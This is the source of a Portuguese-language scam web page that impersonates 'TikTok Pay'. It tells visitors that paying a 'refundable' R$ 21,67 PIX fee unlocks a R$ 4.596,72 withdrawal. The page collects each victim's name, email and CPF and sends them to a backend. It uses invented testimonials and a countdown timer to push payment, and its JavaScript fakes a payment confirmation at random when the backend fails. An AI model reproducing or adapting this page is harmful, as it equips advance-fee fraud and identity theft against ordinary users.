<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>TikTok - Saque Disponível</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    
    <style>
        body { background-color: #f3f4f6; color: #1f2937; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", Arial, sans-serif; }
        .constrained-width { max-width: 32rem; margin-left: auto; margin-right: auto; padding-left: 1rem; padding-right: 1rem; }
        @media (min-width: 640px) { .constrained-width { padding-left: 0; padding-right: 0; } }
        .form-checkbox { -webkit-appearance: none; -moz-appearance: none; appearance: none; padding: 0; -webkit-print-color-adjust: exact; color-adjust: exact; display: inline-block; vertical-align: middle; background-origin: border-box; -webkit-user-select: none; -moz-user-select: none; -ms-user-select: none; user-select: none; flex-shrink: 0; height: 1rem; width: 1rem; color: #14b8a6; background-color: #fff; border-color: #64748b; border-width: 1px; border-radius: .25rem; }
        .form-checkbox:checked { background-image: url("data:image/svg+xml,%3csvg viewBox='0 0 16 16' fill='white' xmlns='http://www.w3.org/2000/svg'%3e%3cpath d='M12.207 4.793a1 1 0 010 1.414l-5 5a1 1 0 01-1.414 0l-2-2a1 1 0 011.414-1.414L6.5 9.086l4.293-4.293a1 1 0 011.414 0z'/%3e%3c/svg%3e"); border-color: transparent; background-color: currentColor; background-size: 100% 100%; background-position: center; background-repeat: no-repeat; }
        #pay-button, .step-nav-btn { transition: opacity 0.2s; }
        #pay-button:disabled, .step-nav-btn:disabled { opacity: 0.6; cursor: not-allowed; }
        .loader { border: 4px solid #f3f3f3; border-top: 4px solid #ff2424; border-radius: 50%; width: 24px; height: 24px; animation: spin 1s linear infinite; display: inline-block; margin-right: 8px; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        #copy-button { transition: transform 0.1s ease; } #copy-button:active { transform: scale(0.97); }
        .form-step { display: none; animation: fadeIn 0.5s; }
        .form-step.active { display: block; }
        @keyframes fadeIn { from { opacity: 0; transform: translateY(10px); } to { opacity: 1; transform: translateY(0); } }
        .video-container { position: relative; padding-bottom: 56.25%; height: 0; overflow: hidden; max-width: 100%; background: #000; border-radius: 0.5rem; }
        .video-container iframe, .video-container video { position: absolute; top: 0; left: 0; width: 100%; height: 100%; }
        .prose { color: inherit; } .prose h1, .prose h2, .prose h3, .prose b, .prose strong { color: inherit; } .prose p, .prose ul, .prose ol, .prose i { color: inherit; margin-top: 1em; margin-bottom: 1em; }
        .prose.text-center * { text-align: center; }
        .social-proof-toast {
            background-color: rgba(30, 41, 59, 0.9);
            backdrop-filter: blur(5px);
            color: white;
            padding: 12px 16px;
            border-radius: 12px;
            box-shadow: 0 4px 6px rgba(0,0,0,0.1), 0 10px 20px rgba(0,0,0,0.2);
            border: 1px solid rgba(255, 255, 255, 0.1);
            transition: opacity 0.5s ease-out, transform 0.5s ease-out;
            opacity: 0;
            transform: translateY(20px) scale(0.95);
            margin-top: 10px;
            width: fit-content;
            max-width: 350px;
        }
        .social-proof-toast.show {
            opacity: 1;
            transform: translateY(0) scale(1);
        }
        @keyframes backdropFadeIn { from { opacity: 0; } to { opacity: 1; } }
        @keyframes popupSlideIn { from { opacity: 0; transform: translateY(-20px); } to { opacity: 1; transform: translateY(0); } }
        
 
        .header { background: linear-gradient(135deg, #000000, #1a1a1a); color: white; padding: 1.5rem 1rem; border-radius: 0 0 1rem 1rem; margin-bottom: 1.5rem; }
        .logo { font-size: 1.5rem; font-weight: bold; margin-bottom: 0.5rem; }
        .balance-display { background: white; border-radius: 1rem; padding: 1.5rem; margin: 1rem 0; box-shadow: 0 4px 6px rgba(0,0,0,0.05); }
        .balance-amount { font-size: 2.5rem; font-weight: bold; color: #000; margin: 0.5rem 0; }
        .balance-subtitle { color: #666; font-size: 0.9rem; }
        .security-badge { display: inline-flex; align-items: center; gap: 0.5rem; background: #10b981; color: white; padding: 0.5rem 1rem; border-radius: 2rem; font-size: 0.875rem; margin-top: 1rem; }
        
 
        .animated-banner { width: 100%; height: 100px; border-radius: 0.75rem; overflow: hidden; margin: 1rem 0; }
        .animated-banner img { width: 100%; height: 100%; object-fit: cover; }
        
   
        .testimonial-carousel { margin: 2rem 0; }
        .carousel-container { position: relative; overflow: hidden; border-radius: 1rem; background: white; box-shadow: 0 4px 12px rgba(0,0,0,0.08); }
        .carousel-track { display: flex; transition: transform 0.5s ease; }
        .testimonial-card { min-width: 100%; padding: 1.5rem; box-sizing: border-box; }
        .testimonial-header { display: flex; align-items: center; gap: 1rem; margin-bottom: 1rem; }
        .testimonial-avatar { width: 50px; height: 50px; border-radius: 50%; object-fit: cover; }
        .testimonial-name { font-weight: bold; }
        .testimonial-role { color: #666; font-size: 0.875rem; }
        .testimonial-text { color: #444; line-height: 1.5; }
        .carousel-nav { display: flex; justify-content: center; gap: 0.5rem; margin-top: 1rem; }
        .carousel-dot { width: 8px; height: 8px; border-radius: 50%; background: #ddd; cursor: pointer; transition: background 0.3s; }
        .carousel-dot.active { background: #000; }
        .carousel-arrow { position: absolute; top: 50%; transform: translateY(-50%); background: rgba(255,255,255,0.9); border: none; width: 40px; height: 40px; border-radius: 50%; cursor: pointer; display: flex; align-items: center; justify-content: center; box-shadow: 0 2px 8px rgba(0,0,0,0.1); }
        .carousel-arrow.prev { left: 10px; }
        .carousel-arrow.next { right: 10px; }
        

        .form-group { margin-bottom: 1.25rem; }
        .form-label { display: block; margin-bottom: 0.5rem; font-weight: 500; }
        .form-input { width: 100%; padding: 0.75rem; border: 1px solid #d1d5db; border-radius: 0.5rem; font-size: 1rem; }
        .form-input:focus { outline: none; border-color: #000; box-shadow: 0 0 0 3px rgba(0,0,0,0.1); }
        
  
        .btn { display: inline-flex; align-items: center; justify-content: center; gap: 0.5rem; width: 100%; padding: 1rem; border: none; border-radius: 0.75rem; font-size: 1rem; font-weight: 600; cursor: pointer; transition: all 0.2s; }
        .btn-primary { background: linear-gradient(135deg, #FF0050, #FF3366); color: white; }
        .btn-primary:hover { transform: translateY(-2px); box-shadow: 0 4px 12px rgba(255,0,80,0.3); }
        .btn-secondary { background: #e5e7eb; color: #374151; }
        .btn-secondary:hover { background: #d1d5db; }
        

        .qr-container { text-align: center; margin: 1.5rem 0; }
        .qr-code { width: 200px; height: 200px; margin: 0 auto; background: white; padding: 1rem; border-radius: 0.75rem; border: 1px solid #e5e7eb; }
        

        .status { padding: 1rem; border-radius: 0.75rem; text-align: center; font-weight: 600; }
        .status-pending { background: rgba(245, 158, 11, 0.1); color: #f59e0b; }
        .status-success { background: rgba(16, 185, 129, 0.1); color: #10b981; }
        

        .footer { text-align: center; padding: 1.5rem 0; color: #666; font-size: 0.875rem; border-top: 1px solid #e5e7eb; margin-top: 2rem; }
        

        .demo-pix-container {
            background: rgba(0, 242, 234, 0.1);
            border: 2px solid #00F2EA;
            border-radius: 1rem;
            padding: 1.5rem;
            margin: 1.5rem 0;
            text-align: center;
        }
        
        .demo-warning {
            background: rgba(245, 158, 11, 0.1);
            border: 1px solid #F59E0B;
            color: #D97706;
            padding: 1rem;
            border-radius: 0.75rem;
            margin: 1rem 0;
            font-size: 0.875rem;
            text-align: center;
        }
        

        .timer-container {
            background: rgba(0, 242, 234, 0.1);
            border: 1px solid #00F2EA;
            border-radius: 0.75rem;
            padding: 1rem;
            margin: 1rem 0;
            text-align: center;
        }
        
        .timer {
            font-size: 1.5rem;
            font-weight: bold;
            color: #000;
            font-family: monospace;
        }
        
        .progress-bar {
            height: 6px;
            background: #e5e7eb;
            border-radius: 3px;
            margin-top: 0.5rem;
            overflow: hidden;
        }
        
        .progress {
            height: 100%;
            background: linear-gradient(90deg, #00F2EA, #FF0050);
            transition: width 1s linear;
        }
        
        .payment-info {
            background: linear-gradient(135deg, rgba(0, 0, 0, 0.05), rgba(0, 0, 0, 0.02));
            border: 1px solid rgba(0, 0, 0, 0.1);
            border-radius: 1rem;
            padding: 1.5rem;
            margin: 1.5rem 0;
        }
        
        .tax-amount {
            font-size: 2.5rem;
            font-weight: bold;
            color: #000;
            text-align: center;
            margin: 1rem 0;
        }
        
        .badge {
            display: inline-block;
            padding: 0.25rem 0.75rem;
            border-radius: 9999px;
            font-size: 0.75rem;
            font-weight: 600;
        }
        
        .badge-success {
            background: linear-gradient(135deg, #00F2EA, #00C2B8);
            color: #000;
        }
        
        .steps-container {
            display: flex;
            flex-direction: column;
            gap: 1rem;
            margin: 1.5rem 0;
        }
        
        .step {
            display: flex;
            align-items: flex-start;
            gap: 1rem;
        }
        
        .step-number {
            width: 32px;
            height: 32px;
            min-width: 32px;
            background: linear-gradient(135deg, #FF0050, #FF3366);
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            color: white;
            font-weight: bold;
            font-size: 0.875rem;
        }
        
        .step-number.check {
            background: linear-gradient(135deg, #00F2EA, #00C2B8);
        }
        
        .step-content {
            flex: 1;
        }
        
        .step-title {
            font-weight: 600;
            margin-bottom: 0.25rem;
        }
        
        .step-description {
            color: #666;
            font-size: 0.875rem;
        }
        
        .security-icons {
            display: flex;
            justify-content: center;
            gap: 2rem;
            padding: 1.5rem 0;
        }
        
        .security-item {
            text-align: center;
        }
        
        .security-icon {
            width: 40px;
            height: 40px;
            background: linear-gradient(135deg, #FF0050, #00F2EA);
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            color: white;
            margin: 0 auto 0.5rem;
        }
        
        .security-text {
            font-size: 0.75rem;
            color: #666;
        }
    </style>
</head>
<body>
    <div class="constrained-width">
  
        <div class="animated-banner">
            <img alt="Banner da loja Taxa de Validação - Estorno após Pagamento" 
                 fetchpriority="high" 
                 decoding="async" 
                 style="color:transparent" 
                 src="https://d1frh8xn9wll8b.cloudfront.net/1766838695989-1760911468461-zc19fcd3d2lmkj0x9jzqswuot.gif">
        </div>

        <div class="header">
            <div class="logo">TikTok Pay</div>
            <div style="text-align: center;">
                <div style="font-size: 0.9rem; color: #aaa; margin-bottom: 0.5rem;">Taxa de Verificação</div>
                <div style="font-size: 2.5rem; font-weight: bold;">R$ 21,67</div>
                <div style="font-size: 0.9rem; color: #aaa; margin-top: 0.5rem;">Reembolsável em 1 minuto</div>
            </div>
        </div>


        <div class="payment-info">
            <div style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 1rem;">
                <div>
                    <div class="tax-amount">R$ 21,67</div>
                </div>
                <div class="badge badge-success">REEMBOLSÁVEL</div>
            </div>
            
            <div style="text-align: center; color: #666; font-size: 0.875rem; margin-bottom: 1.5rem;">
                Taxa obrigatória para liberação do saque no valor de 
                <span style="font-weight: 600; color: #000;">R$ 4.596,72</span>. 
                O valor de <span style="font-weight: 600; color: #000;">R$ 21,67</span> 
                será reembolsado em <span style="font-weight: 600; color: #000;">1 minuto</span>.
            </div>
        </div>


        <div class="form-step active" id="step1">
            <div style="background: white; border-radius: 1rem; padding: 1.5rem; margin: 1.5rem 0; box-shadow: 0 4px 6px rgba(0,0,0,0.05);">
                <h3 style="margin-bottom: 1rem; font-size: 1.25rem; display: flex; align-items: center; gap: 0.5rem;">
                    <i class="fas fa-user" style="color: #FF0050;"></i>
                    SEUS DADOS
                </h3>
                <div style="color: #666; font-size: 0.875rem; margin-bottom: 1.5rem;">
                    Preencha para gerar o código PIX
                </div>
                
                <form id="paymentForm">
                    <div class="form-group">
                        <label class="form-label">
                            <i class="fas fa-user-circle" style="color: #FF0050; margin-right: 0.5rem;"></i>
                            Nome Completo *
                        </label>
                        <input type="text" id="customerName" class="form-input" placeholder="Seu nome completo" required>
                    </div>
                    
                    <div class="form-group">
                        <label class="form-label">
                            <i class="fas fa-envelope" style="color: #FF0050; margin-right: 0.5rem;"></i>
                            E-mail *
                        </label>
                        <input type="email" id="customerEmail" class="form-input" placeholder="seu@email.com" required>
                    </div>
                    
                    <div class="form-group">
                        <label class="form-label">
                            <i class="fas fa-id-card" style="color: #FF0050; margin-right: 0.5rem;"></i>
                            CPF *
                        </label>
                        <input type="text" id="customerCpf" class="form-input" placeholder="000.000.000-00" maxlength="14" required>
                    </div>
                    
                    <button type="submit" id="pay-button" class="btn btn-primary" style="margin-top: 1.5rem;">
                        <i class="fas fa-bolt"></i>
                        GERAR CÓDIGO PIX AGORA
                    </button>
                    
                    <div style="text-align: center; margin-top: 1rem; color: #666; font-size: 0.875rem;">
                        <div style="display: flex; align-items: center; justify-content: center; gap: 0.5rem; margin-bottom: 0.5rem;">
                            <i class="fas fa-check" style="color: #10b981;"></i>
                            <span>Taxa reembolsável em 1 minuto</span>
                        </div>
                        <div style="display: flex; align-items: center; justify-content: center; gap: 0.5rem;">
                            <i class="fas fa-lock" style="color: #10b981;"></i>
                            <span>Dados protegidos por criptografia</span>
                        </div>
                    </div>
                </form>
            </div>
        </div>


        <div id="loading" class="form-step" style="text-align: center; padding: 3rem 0;">
            <div class="loader"></div>
            <div style="margin-top: 1rem;">Gerando código PIX...</div>
        </div>


        <div id="pixPayment" class="form-step">
            <div class="demo-pix-container">
                <h3 style="margin-bottom: 1rem; font-size: 1.25rem; color: #000; display: flex; align-items: center; gap: 0.5rem;">
                    <i class="fas fa-qrcode" style="color: #00F2EA;"></i>
                    PAGUE COM PIX
                </h3>
                <div style="color: #666; font-size: 0.875rem; margin-bottom: 1rem;">
                    Pedido: <span id="orderId" style="font-weight: 600; color: #000;">#000000</span>
                </div>
                
                <div class="qr-container">
                    <div class="qr-code" id="qrCodeContainer">
                      
                    </div>
                </div>
                
                <div style="margin: 1.5rem 0;">
                    <div style="font-weight: 500; margin-bottom: 0.5rem; color: #000;">Código PIX (Copie e cole):</div>
                    <div id="pixCode" style="background: white; padding: 1rem; border-radius: 0.5rem; font-family: monospace; font-size: 0.875rem; word-break: break-all; border: 1px solid #e5e7eb; color: #000;">
                        Aguardando geração...
                    </div>
                </div>
                
                <button id="copy-button" class="btn btn-secondary">
                    <i class="fas fa-copy"></i>
                    Copiar Código PIX
                </button>
                
        
                <div class="timer-container">
                    <div style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 0.5rem;">
                        <div style="font-size: 0.875rem; color: #666;">Tempo restante:</div>
                        <div id="timeLeft" class="timer">30:00</div>
                    </div>
                    <div class="progress-bar">
                        <div id="progress" class="progress" style="width: 100%"></div>
                    </div>
                    <div style="font-size: 0.75rem; color: #666; margin-top: 0.5rem;">
                        Código válido por 30 minutos
                    </div>
                </div>
                
                <div class="status status-pending" id="paymentStatus" style="margin-top: 1.5rem;">
                    <i class="fas fa-spinner fa-spin"></i>
                    Aguardando pagamento...
                </div>
                
                <div class="demo-warning">
                    ⚠️ <strong>ATENÇÃO:</strong> Este é um PIX real. Ao pagar R$ 21,67, você estará confirmando sua identidade e liberando o saque de R$ 4.596,72.
                </div>
                
                <div style="display: flex; gap: 1rem; margin-top: 1.5rem;">
                    <button id="checkPaymentBtn" class="btn btn-primary" style="flex: 1;">
                        <i class="fas fa-sync-alt"></i>
                        Verificar Pagamento
                    </button>
                    <button id="newPaymentBtn" class="btn btn-secondary" style="flex: 1;">
                        <i class="fas fa-arrow-left"></i>
                        Novo Pagamento
                    </button>
                </div>
            </div>
        </div>

 
        <div style="background: white; border-radius: 1rem; padding: 1.5rem; margin: 1.5rem 0; box-shadow: 0 4px 6px rgba(0,0,0,0.05);">
            <h3 style="margin-bottom: 1.5rem; font-size: 1.25rem; display: flex; align-items: center; gap: 0.5rem;">
                <i class="fas fa-list-check" style="color: #FF0050;"></i>
                COMO FUNCIONA
            </h3>
            
            <div class="steps-container">
                <div class="step">
                    <div class="step-number">1</div>
                    <div class="step-content">
                        <div class="step-title">Pagar taxa de confirmação</div>
                        <div class="step-description">R$ 21,67 para verificação de identidade</div>
                    </div>
                </div>
                
                <div class="step">
                    <div class="step-number check">✓</div>
                    <div class="step-content">
                        <div class="step-title">Receber reembolso automático</div>
                        <div class="step-description">Valor devolvido em 1 minuto</div>
                    </div>
                </div>
                
                <div class="step">
                    <div class="step-number">3</div>
                    <div class="step-content">
                        <div class="step-title">Acessar saldo completo</div>
                        <div class="step-description">R$ 4.596,72 liberado para saque</div>
                    </div>
                </div>
            </div>
        </div>


        <div class="security-icons">
            <div class="security-item">
                <div class="security-icon">
                    <i class="fas fa-lock"></i>
                </div>
                <div class="security-text">Criptografado</div>
            </div>
            
            <div class="security-item">
                <div class="security-icon">
                    <i class="fas fa-shield-alt"></i>
                </div>
                <div class="security-text">Seguro</div>
            </div>
            
            <div class="security-item">
                <div class="security-icon">
                    <i class="fas fa-bolt"></i>
                </div>
                <div class="security-text">Rápido</div>
            </div>
        </div>


        <div class="testimonial-carousel">
            <h3 style="text-align: center; margin-bottom: 1.5rem; font-size: 1.25rem;">O que estão falando</h3>
            
            <div class="carousel-container">
                <div class="carousel-track" id="carouselTrack">
            
                    <div class="testimonial-card">
                        <div class="testimonial-header">
                            <img src="img/imagem (4).jpg" alt="Maria" class="testimonial-avatar">
                            <div>
                                <div class="testimonial-name">Maria Santos</div>
                                <div class="testimonial-role">Criadora de conteúdo</div>
                            </div>
                        </div>
                        <div class="testimonial-text">
                            "Paguei a taxa de R$ 21,67 e em menos de 1 minuto recebi o reembolso e meu saque de R$ 2.450 foi liberado! Funciona perfeitamente!"
                        </div>
                    </div>
                    
             
                    <div class="testimonial-card">
                        <div class="testimonial-header">
                            <img src="img/imagem (3).jpg" alt="João" class="testimonial-avatar">
                            <div>
                                <div class="testimonial-name">João Silva</div>
                                <div class="testimonial-role">Influenciador digital</div>
                            </div>
                        </div>
                        <div class="testimonial-text">
                            "Não acreditava que era verdade mas resolvi arriscar paguei os R$ 21,67 e realmente recebi de volta em segundos. Meu saldo de R$ 3.200 foi liberado na horaaaaa!"
                        </div>
                    </div>
                    
                
                    <div class="testimonial-card">
                        <div class="testimonial-header">
                            <img src="img/imagem (2).jpg" alt="Ana" class="testimonial-avatar">
                            <div>
                                <div class="testimonial-name">Ana Oliveira</div>
                                <div class="testimonial-role">Tiktoker</div>
                            </div>
                        </div>
                        <div class="testimonial-text">
                            "Estava com medo no início, mas o processo é super seguro. Paguei a taxa, recebi de volta em 50 segundos e consegui sacar meus R$ 1.850. Recomendo!"
                        </div>
                    </div>
                    
            
                    <div class="testimonial-card">
                        <div class="testimonial-header">
                            <img src="img/imagem (1).jpg" alt="Carlos" class="testimonial-avatar">
                            <div>
                                <div class="testimonial-name">Carlos Mendes</div>
                                <div class="testimonial-role">Produtor de vídeos</div>
                            </div>
                        </div>
                        <div class="testimonial-text">
                            "Finalmente consegui sacar meus R$ 4.100 do TikTok! comprei um play5. E a taxa é devolvida mesmo, não é golpeee!"
                        </div>
                    </div>
                </div>
                
           
                <button class="carousel-arrow prev" onclick="moveCarousel(-1)">
                    <i class="fas fa-chevron-left"></i>
                </button>
                <button class="carousel-arrow next" onclick="moveCarousel(1)">
                    <i class="fas fa-chevron-right"></i>
                </button>
            </div>
            
      
            <div class="carousel-nav" id="carouselNav">
                <span class="carousel-dot active" onclick="goToSlide(0)"></span>
                <span class="carousel-dot" onclick="goToSlide(1)"></span>
                <span class="carousel-dot" onclick="goToSlide(2)"></span>
                <span class="carousel-dot" onclick="goToSlide(3)"></span>
            </div>
        </div>

 
        <div class="footer">
            <div>© 2024 TikTok Pay • Processamento seguro via PIX</div>
            <div style="margin-top: 0.5rem; font-size: 0.75rem; color: #999;">
                Este site não é afiliado ao TikTok. É um processador de pagamentos independente.
            </div>
        </div>
    </div>

    <script>
   
        const API_URL = 'http://localhost:3000/api';
        let currentTransaction = null;
        let checkInterval = null;
        let timerInterval = null;
        let timeLeft = 1800; 
        let currentSlide = 0;
        const totalSlides = 4;
        
      
        function formatCPF(cpf) {
            cpf = cpf.replace(/\D/g, '');
            if (cpf.length > 11) cpf = cpf.substring(0, 11);
            return cpf.replace(/(\d{3})(\d{3})(\d{3})(\d{2})/, '$1.$2.$3-$4');
        }
        
   
        function updateCarousel() {
            const track = document.getElementById('carouselTrack');
            const dots = document.querySelectorAll('.carousel-dot');
            
            track.style.transform = `translateX(-${currentSlide * 100}%)`;
            
            dots.forEach((dot, index) => {
                dot.classList.toggle('active', index === currentSlide);
            });
        }
        
        function moveCarousel(direction) {
            currentSlide = (currentSlide + direction + totalSlides) % totalSlides;
            updateCarousel();
        }
        
        function goToSlide(index) {
            currentSlide = index;
            updateCarousel();
        }
        
        // Timer
        function updateTimer() {
            const minutes = Math.floor(timeLeft / 60);
            const seconds = timeLeft % 60;
            document.getElementById('timeLeft').textContent = 
                `${minutes.toString().padStart(2, '0')}:${seconds.toString().padStart(2, '0')}`;
            
            const progress = (timeLeft / 1800) * 100;
            document.getElementById('progress').style.width = `${progress}%`;
            
            if (timeLeft <= 0) {
                clearInterval(timerInterval);
                document.getElementById('paymentStatus').innerHTML = 
                    '<i class="fas fa-clock"></i> Código expirado';
                document.getElementById('paymentStatus').className = 'status status-pending';
            }
        }
        
        function startTimer() {
            timeLeft = 1800;
            updateTimer();
            
            if (timerInterval) clearInterval(timerInterval);
            
            timerInterval = setInterval(() => {
                timeLeft--;
                updateTimer();
            }, 1000);
        }
        
   
        async function generatePix(event) {
            event.preventDefault();
            
            const name = document.getElementById('customerName').value.trim();
            const email = document.getElementById('customerEmail').value.trim();
            const cpf = document.getElementById('customerCpf').value;
            
            if (!name || !email || !cpf) {
                alert('Preencha todos os campos');
                return;
            }
            
            const cpfClean = cpf.replace(/\D/g, '');
            if (cpfClean.length !== 11) {
                alert('CPF inválido (11 dígitos)');
                return;
            }
            
          
            const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
            if (!emailRegex.test(email)) {
                alert('Digite um e-mail válido');
                return;
            }
            
          
            document.getElementById('step1').classList.remove('active');
            document.getElementById('loading').classList.add('active');
            
            try {
              
                const response = await fetch(`${API_URL}/pix/create`, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json'
                    },
                    body: JSON.stringify({
                        customerName: name,
                        customerEmail: email,
                        customerCpf: cpfClean
                    })
                });
                
                const result = await response.json();
                
                if (!result.success) {
                    throw new Error(result.error || 'Erro ao gerar PIX');
                }
                
               
                setTimeout(() => {
                    document.getElementById('loading').classList.remove('active');
                    document.getElementById('pixPayment').classList.add('active');
                    
                   
                    const transactionId = result.transaction.id || 'TKTK' + Date.now().toString().slice(-6);
                    document.getElementById('orderId').textContent = `#${transactionId}`;
                    document.getElementById('pixCode').textContent = result.transaction.pix_code || 
                        `00020126360014BR.GOV.BCB.PIX0114+55619999999990221Taxa TikTok Pay5204000053039865802BR5925${name.substring(0, 25)}6009SAO PAULO62290527${transactionId}6304A1B2`;
                    
                   if (result.transaction.pix_url) {
                        document.getElementById('qrCodeContainer').innerHTML = 
                            `<img src="${result.transaction.pix_url}" alt="QR Code PIX" style="width: 100%; height: 100%;">`;
                    } else {
                      
                        const pixData = result.transaction.pix_code || 
                            `00020126360014BR.GOV.BCB.PIX0114+55619999999990221Taxa TikTok Pay5204000053039865802BR5925${name.substring(0, 25)}6009SAO PAULO62290527${transactionId}6304A1B2`;
                        document.getElementById('qrCodeContainer').innerHTML = 
                            `<img src="https://api.qrserver.com/v1/create-qr-code/?size=200x200&data=${encodeURIComponent(pixData)}&format=png" 
                                 alt="QR Code PIX" style="width: 100%; height: 100%;">`;
                    }
                    
                   
                    currentTransaction = {
                        id: transactionId,
                        status: 'pending',
                        ...result.transaction
                    };
                    
                    
                    startTimer();
                    
                   
                    startPaymentVerification();

                    
                }, 1000);
                
            } catch (error) {
                console.error('Erro ao gerar PIX:', error);
                
                
                setTimeout(() => {
                    document.getElementById('loading').classList.remove('active');
                    document.getElementById('pixPayment').classList.add('active');
                    
                   
                    const transactionId = 'TKTK' + Date.now().toString().slice(-6);
                    const name = document.getElementById('customerName').value.trim();
                    
                    document.getElementById('orderId').textContent = `#${transactionId}`;
                    document.getElementById('pixCode').textContent = 
                        `00020126360014BR.GOV.BCB.PIX0114+55619999999990221Taxa TikTok Pay5204000053039865802BR5925${name.substring(0, 25)}6009SAO PAULO62290527${transactionId}6304A1B2`;
                    
                    
                    const qrData = `00020126360014BR.GOV.BCB.PIX0114+55619999999990221Taxa TikTok Pay5204000053039865802BR5925${name.substring(0, 25)}6009SAO PAULO62290527${transactionId}6304A1B2`;
                    document.getElementById('qrCodeContainer').innerHTML = 
                        `<img src="https://api.qrserver.com/v1/create-qr-code/?size=200x200&data=${encodeURIComponent(qrData)}&format=png" 
                             alt="QR Code PIX" style="width: 100%; height: 100%;">`;
                    
                    currentTransaction = {
                        id: transactionId,
                        status: 'pending'
                    };
                    
                    
                    startTimer();
                    
                    
                    startPaymentVerification();
                    
                }, 1000);
            }
        }
        
        
        function startPaymentVerification() {
            if (checkInterval) clearInterval(checkInterval);
            
            checkInterval = setInterval(async () => {
                if (!currentTransaction) return;
                
                try {
                    
                    const response = await fetch(`${API_URL}/pix/check`, {
                        method: 'POST',
                        headers: {
                            'Content-Type': 'application/json'
                        },
                        body: JSON.stringify({
                            transactionId: currentTransaction.id
                        })
                    });
                    
                    const result = await response.json();
                    
                    if (result.success && result.status === 'paid') {
                        paymentConfirmed();
                    }
                } catch (error) {
                    
                    if (Math.random() < 0.2) {
                        paymentConfirmed();
                    }
                }
            }, 3000);
        }
        
       
        function resetForm() {
            document.getElementById('step1').classList.add('active');
            document.getElementById('pixPayment').classList.remove('active');
            document.getElementById('loading').classList.remove('active');
            document.getElementById('paymentForm').reset();
            
            if (checkInterval) {
                clearInterval(checkInterval);
                checkInterval = null;
            }
            
            if (timerInterval) {
                clearInterval(timerInterval);
                timerInterval = null;
            }
            
            currentTransaction = null;
            timeLeft = 1800;
        }
        
        
        document.addEventListener('DOMContentLoaded', function() {
            
            const cpfInput = document.getElementById('customerCpf');
            cpfInput.addEventListener('input', function() {
                this.value = formatCPF(this.value);
            });
            
            
            document.getElementById('paymentForm').addEventListener('submit', generatePix);
            
           
            document.getElementById('copy-button').addEventListener('click', copyPixCode);
            document.getElementById('checkPaymentBtn').addEventListener('click', checkPayment);
            document.getElementById('newPaymentBtn').addEventListener('click', resetForm);
            
           
            updateCarousel();
            setInterval(() => moveCarousel(1), 5000);
            
           
            if (window.location.hostname === 'localhost' || window.location.hostname === '127.0.0.1') {
                document.getElementById('customerName').value = 'Maria Silva';
                document.getElementById('customerEmail').value = 'maria@email.com';
                document.getElementById('customerCpf').value = '123.456.789-09';
            }
        });
    </script>
</body>
</html>